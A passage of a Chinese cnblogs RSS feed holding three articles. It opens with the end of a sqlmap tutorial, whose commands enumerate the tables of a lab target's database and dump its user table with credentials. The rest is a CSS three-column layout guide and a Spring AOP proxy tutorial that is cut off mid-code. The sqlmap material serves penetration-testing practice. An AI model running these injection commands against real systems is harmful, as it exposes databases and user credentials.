sqlmap -u &quot;http://192.168.1.3/webug/pentest/test/sqli/sqltamp.php?gid=1&quot; -p gid  -D  pentesterlab --tables
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/946454/201908/946454-20190817061451416-1034108325.png&quot; alt=&quot;&quot; width=&quot;700&quot;/&gt;&lt;/p&gt;

&lt;p&gt;接下来是暴露表字段。我们需要dump &lt;span&gt;&lt;strong&gt;user&lt;/strong&gt;&lt;/span&gt;表下面的字段信息并保存到本地文件。俗称脱裤。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:sql;gutter:true;&quot;&gt;
sqlmap -u &quot;http://192.168.1.3/webug/pentest/test/sqli/sqltamp.php?gid=1&quot; -p gid  -D  pentesterlab -T user --dump
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/946454/201908/946454-20190817061746376-1188755636.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;这样，我们靶机的系统用户名和密码就全部暴露出来了。是不是很简单？&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/946454/201908/946454-20190817062658812-1887462546.png&quot; alt=&quot;&quot; width=&quot;700&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;演示视频：&lt;a href=&quot;https://asciinema.org/a/46601&quot; rel=&quot;nofollow&quot;&gt;https://asciinema.org/a/46601&lt;/a&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;

</description>
<pubDate>Fri, 16 Aug 2019 22:28:00 +0000</pubDate>
<dc:creator>飞天小子</dc:creator>
<og:description>sqlmap简介 sqlmap是一个开源的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。 它具有功能强大的检测引擎,针对各种不同类型数据库的渗透测试的功能选项，包括</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/Zfc-Cjk/p/11367279.html</dc:identifier>
</item>
<item>
<title>探讨“左右定宽，中间自适应”的几种布局方式 - Leophen</title>
<link>http://www.cnblogs.com/Leophen/p/11367131.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/Leophen/p/11367131.html</guid>
<description>&lt;h2&gt;一、实现“左右定宽，中间自适应”三栏效果的5种方式&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1731684/201908/1731684-20190817012212403-1485442556.gif&quot; alt=&quot;&quot; width=&quot;494&quot; height=&quot;213&quot;/&gt;&lt;/p&gt;
&lt;p&gt;基本 DOM 结构：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;article &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;container&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;left&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;this is left&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;center&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;this is center this is center this is 
center&lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;right&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;this is right&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;article&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h3&gt;1、使用浮动&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;div &lt;/span&gt;{&lt;span&gt;
  min-height&lt;/span&gt;:&lt;span&gt; 400px&lt;/span&gt;;
}&lt;span&gt;
.left &lt;/span&gt;{&lt;span&gt;
  width&lt;/span&gt;:&lt;span&gt; 200px&lt;/span&gt;;&lt;span&gt;
  background&lt;/span&gt;:&lt;span&gt; pink&lt;/span&gt;;&lt;span&gt;
  float&lt;/span&gt;:&lt;span&gt; left&lt;/span&gt;;
}&lt;span&gt;
.center &lt;/span&gt;{&lt;span&gt;
  background&lt;/span&gt;:&lt;span&gt; lightgreen&lt;/span&gt;;
}&lt;span&gt;
.right &lt;/span&gt;{&lt;span&gt;
  width&lt;/span&gt;:&lt;span&gt; 200px&lt;/span&gt;;&lt;span&gt;
  background&lt;/span&gt;:&lt;span&gt; lightblue&lt;/span&gt;;&lt;span&gt;
  float&lt;/span&gt;:&lt;span&gt; right&lt;/span&gt;;
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;左栏和右栏分别设置 float 为 left 和 right&lt;/p&gt;
&lt;p&gt;注意：使用此方式 HTML 中三栏的顺序为：左-右-中&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;article &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;container&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;left&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;this is left&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;right&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;this is right&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;center&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;this is center this is center this is 
center&lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;article&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h3&gt;2、使用绝对定位&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;div &lt;/span&gt;{&lt;span&gt;
  min-height&lt;/span&gt;:&lt;span&gt; 400px&lt;/span&gt;;
}&lt;span&gt;
.left &lt;/span&gt;{&lt;span&gt;
  width&lt;/span&gt;:&lt;span&gt; 200px&lt;/span&gt;;&lt;span&gt;
  background&lt;/span&gt;:&lt;span&gt; pink&lt;/span&gt;;&lt;span&gt;
  position&lt;/span&gt;:&lt;span&gt; absolute&lt;/span&gt;;&lt;span&gt;
  left&lt;/span&gt;:&lt;span&gt; 0&lt;/span&gt;;
}&lt;span&gt;
.center &lt;/span&gt;{&lt;span&gt;
  background&lt;/span&gt;:&lt;span&gt; lightgreen&lt;/span&gt;;&lt;span&gt;
  position&lt;/span&gt;:&lt;span&gt; absolute&lt;/span&gt;;&lt;span&gt;
  left&lt;/span&gt;:&lt;span&gt; 200px&lt;/span&gt;;&lt;span&gt;
  right&lt;/span&gt;:&lt;span&gt; 200px&lt;/span&gt;;
}&lt;span&gt;
.right &lt;/span&gt;{&lt;span&gt;
  width&lt;/span&gt;:&lt;span&gt; 200px&lt;/span&gt;;&lt;span&gt;
  background&lt;/span&gt;:&lt;span&gt; lightblue&lt;/span&gt;;&lt;span&gt;
  position&lt;/span&gt;:&lt;span&gt; absolute&lt;/span&gt;;&lt;span&gt;
  right&lt;/span&gt;:&lt;span&gt; 0&lt;/span&gt;;
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;对三栏设 position 为 absolute，左栏和右栏分别设 left 和 right 的值为 0，中间栏设置 left 和 right 的值为左栏和右栏的宽度&lt;/p&gt;
&lt;p&gt;此方式 HTML 中三栏的顺序不影响最终效果&lt;/p&gt;

&lt;h3&gt;3、使用弹性布局&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;div &lt;/span&gt;{&lt;span&gt;
  min-height&lt;/span&gt;:&lt;span&gt; 400px&lt;/span&gt;;
}&lt;span&gt;
article &lt;/span&gt;{&lt;span&gt;
  display&lt;/span&gt;:&lt;span&gt; flex&lt;/span&gt;;
}&lt;span&gt;
.left &lt;/span&gt;{&lt;span&gt;
  width&lt;/span&gt;:&lt;span&gt; 200px&lt;/span&gt;;&lt;span&gt;
  background&lt;/span&gt;:&lt;span&gt; pink&lt;/span&gt;;
}&lt;span&gt;
.center &lt;/span&gt;{&lt;span&gt;
  background&lt;/span&gt;:&lt;span&gt; lightgreen&lt;/span&gt;;&lt;span&gt;
  flex&lt;/span&gt;:&lt;span&gt; 1&lt;/span&gt;;
}&lt;span&gt;
.right &lt;/span&gt;{&lt;span&gt;
  width&lt;/span&gt;:&lt;span&gt; 200px&lt;/span&gt;;&lt;span&gt;
  background&lt;/span&gt;:&lt;span&gt; lightblue&lt;/span&gt;;
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;为三栏的父元素设置 display 为 flex，并在中间栏设置 flex 的值为 1&lt;/p&gt;
&lt;p&gt;注意：使用此方式 HTML 中三栏的顺序为：左-中-右&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;article &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;container&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;left&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;this is left&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;center&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;this is center this is center this is 
center&lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;right&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;this is right&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;article&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h3&gt;4、使用表格布局&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;article &lt;/span&gt;{&lt;span&gt;
  width&lt;/span&gt;:&lt;span&gt; 100%&lt;/span&gt;;&lt;span&gt;
  height&lt;/span&gt;:&lt;span&gt; 400px&lt;/span&gt;;&lt;span&gt;
  display&lt;/span&gt;:&lt;span&gt; table&lt;/span&gt;;
}&lt;span&gt;
.left &lt;/span&gt;{&lt;span&gt;
  width&lt;/span&gt;:&lt;span&gt; 200px&lt;/span&gt;;&lt;span&gt;
  background&lt;/span&gt;:&lt;span&gt; pink&lt;/span&gt;;&lt;span&gt;
  display&lt;/span&gt;:&lt;span&gt; table-cell&lt;/span&gt;;
}&lt;span&gt;
.center &lt;/span&gt;{&lt;span&gt;
  background&lt;/span&gt;:&lt;span&gt; lightgreen&lt;/span&gt;;&lt;span&gt;
  display&lt;/span&gt;:&lt;span&gt; table-cell&lt;/span&gt;;
}&lt;span&gt;
.right &lt;/span&gt;{&lt;span&gt;
  width&lt;/span&gt;:&lt;span&gt; 200px&lt;/span&gt;;&lt;span&gt;
  background&lt;/span&gt;:&lt;span&gt; lightblue&lt;/span&gt;;&lt;span&gt;
  display&lt;/span&gt;:&lt;span&gt; table-cell&lt;/span&gt;;
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;对三栏的父元素设置 display 为 table，同时设置宽和高，并对三栏设 display 为 table-cell&lt;/p&gt;
&lt;p&gt;注意：使用此方式 HTML 中三栏的顺序为：左-中-右&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;article &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;container&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;left&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;this is left&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;center&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;this is center this is center this is 
center&lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;right&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;this is right&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;article&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h3&gt;5、使用网格布局&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;article &lt;/span&gt;{&lt;span&gt;
  width&lt;/span&gt;:&lt;span&gt; 100%&lt;/span&gt;;&lt;span&gt;
  display&lt;/span&gt;:&lt;span&gt; grid&lt;/span&gt;;&lt;span&gt;
  grid-template-rows&lt;/span&gt;:&lt;span&gt; 400px&lt;/span&gt;;&lt;span&gt;
  grid-template-columns&lt;/span&gt;:&lt;span&gt; 200px auto 200px&lt;/span&gt;;
}&lt;span&gt;
.left &lt;/span&gt;{&lt;span&gt;
  background&lt;/span&gt;:&lt;span&gt; pink&lt;/span&gt;;
}&lt;span&gt;
.center &lt;/span&gt;{&lt;span&gt;
  background&lt;/span&gt;:&lt;span&gt; lightgreen&lt;/span&gt;;
}&lt;span&gt;
.right &lt;/span&gt;{&lt;span&gt;
  background&lt;/span&gt;:&lt;span&gt; lightblue&lt;/span&gt;;
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;对三栏的父元素设置 display 为 grid，同时设置宽度、grid-template-rows 和 grid-template-columns&lt;/p&gt;
&lt;p&gt;注意：使用此方式 HTML 中三栏的顺序为：左-中-右&lt;/p&gt;

&lt;h2&gt;二、如果增加任一栏的高度，哪个能正常拉伸？效果如下：&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1731684/201908/1731684-20190817021004030-1811746526.gif&quot; alt=&quot;&quot; width=&quot;499&quot; height=&quot;309&quot;/&gt;&lt;/p&gt;
&lt;p&gt;上述五种方式中，只有 flex 和 table 两种方式能在增加高度时正常撑开&lt;/p&gt;

</description>
<pubDate>Fri, 16 Aug 2019 17:23:00 +0000</pubDate>
<dc:creator>Leophen</dc:creator>
<og:description>一、实现“左右定宽，中间自适应”三栏效果的5种方式 基本 DOM 结构： 1、使用浮动 左栏和右栏分别设置 float 为 left 和 right 注意：使用此方式 HTML 中三栏的顺序为：左-右</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/Leophen/p/11367131.html</dc:identifier>
</item>
<item>
<title>Spring系列（四）：Spring AOP详解 - toby.xu</title>
<link>http://www.cnblogs.com/toby-xu/p/11361351.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/toby-xu/p/11361351.html</guid>
<description>&lt;h2&gt;一、AOP是什么&lt;/h2&gt;
&lt;p&gt;　　AOP（面向切面编程），可以说是一种编程思想，其中的Spring AOP和AspectJ都是现实了这种编程思想。相对OOP（面向过程编程）来说，提供了另外一种编程方式，对于OOP过程中产生的横切性问题，这些横切性与业务无关，可以通过预编译方式和运行期动态代理来实现。比如可以应用在：日志记录、性能监控、事务管理等。&lt;/p&gt;
&lt;h2&gt;二、AOP的基本概念&lt;/h2&gt;
&lt;p&gt;　　&lt;strong&gt;Aspect（切面）&lt;/strong&gt;：通常来说是一个类，里面定义了切点和通知，Spring AOP中可以用@AspectJ来标注这个类是切面；&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;Join point（连接点）&lt;/strong&gt;：可以理解成目标对象中的方法，该方法是要被增强的方法，也就是我们要作用的一个切入点；&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;Pointcut（切点）&lt;/strong&gt;：切点可以理解成连接点的集合；&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;Target object（目标对象）&lt;/strong&gt;：被代理的对象，也就是目标对象；&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;AOP proxy（代理对象）&lt;/strong&gt;：把被代理的对象织入了增强后的对象；&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;Weaving（织入）&lt;/strong&gt;：把增强也就是代理逻辑加入到目标对象上的过程；&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　Advice（通知）&lt;/strong&gt;：用于指定在特定连接点上的增强的位置；&lt;/p&gt;
&lt;p&gt;　　　　① Before advice（前置通知）：在目标方法被调用之前调用通知；&lt;/p&gt;
&lt;p&gt;　　　　② After returning advice（返回通知）：在目标方法成功执行之后调用通知；&lt;/p&gt;
&lt;p&gt;　　　　③ After throwing advice（异常通知）：在目标方法抛出异常后调用通知；&lt;/p&gt;
&lt;p&gt;　　　　④ After (finally) advice（后置通知）：在目标方法完成之后调用通知（&lt;span&gt;&lt;strong&gt;不论是否出现异常都会执行，finally中调用&lt;/strong&gt;&lt;/span&gt;）；&lt;/p&gt;
&lt;p&gt;　　　　⑤ Around advice（环绕通知）：围绕连接点(目标方法)的通知。可以在方法调用前后执行自定义行为；&lt;/p&gt;
&lt;h2&gt;三、代理的实现方式&lt;/h2&gt;
&lt;p&gt;　　我们知道AOP可以通过预编译的方式和运行期动态代理来实现，那么代理的实现方式有哪些呢？&lt;/p&gt;
&lt;p&gt;　　我们定义一个接口类：UserService&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.toby.service;

&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * @desc: user 业务接口类
 * &lt;/span&gt;&lt;span&gt;@author&lt;/span&gt;&lt;span&gt;: toby
 * @date: 2019/8/4 23:28
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; UserService {
    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 添加
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;void&lt;/span&gt;&lt;span&gt; add();
    
    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * say hello
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; name
     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;
     &lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    String say(String name);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　在定义一个实现类UserServiceImpl&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.toby.service.impl;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.toby.service.UserService;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.stereotype.Service;

&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * @desc: user业务的实现类
 * &lt;/span&gt;&lt;span&gt;@author&lt;/span&gt;&lt;span&gt;: toby
 * @date: 2019/8/4 23:29
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
@Service
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; UserServiceImpl &lt;span&gt;implements&lt;/span&gt;&lt;span&gt; UserService {

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; add() {
        System.out.println(&lt;/span&gt;&quot;执行UserServiceImpl的add方法&quot;&lt;span&gt;);
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String say(String name) {
        System.out.println(&lt;/span&gt;&quot;执行UserServiceImpl的say方法 args = &quot; +&lt;span&gt; name);
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &quot;hello &quot; +&lt;span&gt; name;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;　　第一种：静态代理&lt;/h3&gt;
&lt;p&gt;　　定义一个静态代理类，需要实现UserService接口：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.toby.proxy;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.toby.service.UserService;

&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * @desc: 静态代理
 * &lt;/span&gt;&lt;span&gt;@author&lt;/span&gt;&lt;span&gt;: toby
 * @date: 2019/8/4 23:30
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; StaticProxy &lt;span&gt;implements&lt;/span&gt;&lt;span&gt; UserService {

    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; UserService userService;

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; StaticProxy(UserService userService){
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.userService =&lt;span&gt; userService;
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; add() {
        System.out.println(&lt;/span&gt;&quot;添加日志开始&quot;&lt;span&gt;);
        userService.add();
        System.out.println(&lt;/span&gt;&quot;添加日志结束&quot;&lt;span&gt;);
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String say(String name) {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &quot;&quot;&lt;span&gt;;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;　　第二种：Jdk动态代理&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.toby.proxy;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.lang.reflect.InvocationHandler;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.lang.reflect.Method;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.lang.reflect.Proxy;

&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * @desc: JDK动态代理 实现一个接口：InvocationHandler
 * JDK的动态代理机制只能代理实现了接口的类，而没有实现接口的类就不能实现JDK的动态代理
 * &lt;/span&gt;&lt;span&gt;@author&lt;/span&gt;&lt;span&gt;: toby
 * @date: 2019/8/4 23:34
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; JdkDynamicProxy &lt;span&gt;implements&lt;/span&gt;&lt;span&gt; InvocationHandler {
    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 目标对象
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt;&lt;span&gt; Object targetObject;

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Object createJdkProxy(&lt;span&gt;final&lt;/span&gt;&lt;span&gt; Object targetObject){
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.targetObject =&lt;span&gt; targetObject;
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; Proxy.newProxyInstance(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.targetObject.getClass().getClassLoader(),
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.targetObject.getClass().getInterfaces(),&lt;span&gt;this&lt;/span&gt;&lt;span&gt;);
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Object invoke(Object proxy, Method method, Object[] args) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Throwable {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;写对应的增强代码&lt;/span&gt;
        System.out.println(&quot;Jdk日志记录开始&quot;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;调用真正的业务方法&lt;/span&gt;
        Object obj = method.invoke(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.targetObject,args);
        System.out.println(&lt;/span&gt;&quot;Jdk日志记录结束&quot;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; obj;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;　　第三种：Cglib动态代理&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.toby.proxy;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.cglib.proxy.Enhancer;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.cglib.proxy.MethodInterceptor;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.cglib.proxy.MethodProxy;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.lang.reflect.Method;

&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * @desc: CGLIB动态代理 cglib是针对类来实现代理的，他的原理是对指定的目标类生成一个子类，
 * 并覆盖其中方法实现增强，但因为采用的是继承，所以不能对final修饰的类进行代理
 * &lt;/span&gt;&lt;span&gt;@author&lt;/span&gt;&lt;span&gt;: toby
 * @date: 2019/8/4 23:43
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
